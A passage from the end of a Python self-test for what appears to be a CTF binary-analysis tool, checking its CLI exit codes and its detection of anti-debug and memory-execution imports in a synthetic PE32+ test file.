                and _run_cli(["x", "--lane", "nope"])[0] == 2 and _run_cli(["x", "--flag-format", "("])[0] == 2
                and _run_cli(["/nonexistent/file"])[0] == 1 and _run_cli(["engines"])[0] == 0
                and rcj == 0 and jok and rc1 == 0 and content_ok and rc2 == 1)
    chk("S14 CLI contract and exit codes", s14)

    def s15() -> bool:
        r = analyze(_build_revauto_test_pe(), "t.exe", Options(), no_eng)
        b = r.binary or {}
        names = {i["name"] for i in b.get("imports", [])}
        return (b.get("format") == "PE32+" and {"IsDebuggerPresent", "VirtualAlloc"} <= names
                and {"T-ANTI-DEBUG", "T-MEMORY-EXEC", "T-TIMING"} <= tells(r) and "CyberSci{pe_ok}" in r.flags)
    chk("S15 PE32+ minimal (imports, tells, flag)", s15)

    tmp.cleanup()
    ok = all(results)
    print(f"selftest: {'OK' if ok else 'FAILED'}")
    return ok


_WHICH_HOLDER = [shutil.which]


if __name__ == "__main__":
    sys.exit(run(sys.argv[1:]))
